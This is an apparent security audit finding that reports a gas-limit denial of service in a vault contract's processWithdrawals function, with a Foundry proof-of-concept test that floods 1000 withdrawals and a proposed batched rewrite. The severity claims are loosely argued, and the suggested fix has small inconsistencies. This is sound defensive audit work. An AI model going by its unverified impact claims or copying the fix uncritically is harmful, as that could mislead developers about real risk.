# Possible DOS Attack in `Vault::processWithdrawals::`

## Summary

Possible DOS attack within `Vault::processWithdrawals::`. The function processes an array of user addresses and performs multiple operations, including external calls to ERC20 token contracts. If the input array is very large, the function can whit the block gas limit, causing the transaction to fail. 

## Vulnerability Detail

A denial of service attack can occur within the `Vault::processWithdrawals::` function if the array of users gets to large. If this was to happen the impact would be High, with potential loss of funds along with the protocol not working as intended.

Problem function below

## Impact

High Impact - a DOS attack would stop legitimate withdrawals from occuring along with potential loss of funds disrupting the entire protocol. 

## Code Snippet
Below is a POC I put together, successfully breaking withdrawals by increasing the user's array to 1000 people. 

```javascript
function testDOSAttackAuditorNate() public {
        Vault vault = new Vault("Mellow LRT Vault", "mLRT", admin);
        vm.startPrank(admin);
        vault.grantRole(vault.ADMIN_DELEGATE_ROLE(), admin);
        vault.grantRole(vault.OPERATOR(), operator);
        vm.stopPrank();
        _initialDeposit(vault);

        // Simulate a large number of users to trigger the gas limit
        uint256 largeNumber = 1000; // Adjust based on gas limit testing
        address[] memory users = new address[](largeNumber);

        // Create multiple users and add them to pending withdrawals
        for (uint256 i = 0; i < largeNumber; i++) {
            address depositor = address(bytes20(keccak256(abi.encodePacked("depositor", i))));
            users[i] = depositor;

            vm.startPrank(depositor);
            deal(Constants.WSTETH, depositor, 10 ether);
            IERC20(Constants.WSTETH).safeIncreaseAllowance(address(vault), 10 ether);
            uint256[] memory amounts = new uint256[](3);
            amounts[0] = 10 ether;
            uint256[] memory minAmounts = amounts;
            vault.deposit(depositor, amounts, 10 ether, type(uint256).max);
            vault.registerWithdrawal(depositor, 10 ether, minAmounts, type(uint256).max, type(uint256).max, false);
            vm.stopPrank();
        }

        vm.startPrank(operator);

        try vault.processWithdrawals(users) {
            // This should fail if there's a DOS attack
            console.log("Processing succeeded unexpectedly.");
        } catch {
            console.log("DOS attack confirmed: transaction ran out of gas.");
        }

        vm.stopPrank();
    }
```

## Tool used

Manual Review

## Recommendation

Implement batch processing to handle withdrawals in smaller chunks reducing the likelihood of exceeding the gas limit. I have written an example below.

```javascript
function processWithdrawals(
    address[] memory users,
    uint256 start,
    uint256 end
) external nonReentrant returns (bool[] memory statuses) {
    require(start < end, "Invalid range");
    require(end <= users.length, "End index out of bounds");

    _requireAtLeastOperator();
    statuses = new bool[](end - start);
    ProcessWithdrawalsStack memory s = calculateStack();
    uint256 burningSupply = 0;

    for (uint256 i = start; i < end; i++) {
        address user = users[i];
        if (!_pendingWithdrawers.contains(user)) continue;
        WithdrawalRequest memory request = _withdrawalRequest[user];
        (
            bool isProcessingPossible,
            bool isWithdrawalPossible,
            uint256[] memory expectedAmounts
        ) = analyzeRequest(s, request);

        if (!isProcessingPossible) {
            _cancelWithdrawalRequest(user);
            continue;
        }

        if (!isWithdrawalPossible) continue;

        for (uint256 j = 0; j < s.tokens.length; j++) {
            s.erc20Balances[j] -= expectedAmounts[j];
            IERC20(s.tokens[j]).safeTransfer(
                request.to,
                expectedAmounts[j]
            );
        }

        burningSupply += request.lpAmount;
        delete _withdrawalRequest[user];
        _pendingWithdrawers.remove(user);
        statuses[i - start] = true;
    }

    if (burningSupply > 0) {
        _burn(address(this), burningSupply);
        emit WithdrawalsProcessed(users, statuses);
    }

    address callback = configurator.withdrawalCallback();
    if (callback != address(0)) {
        IWithdrawalCallback(callback).withdrawalCallback();
        emit WithdrawCallback(callback);
    }

    return statuses;
}
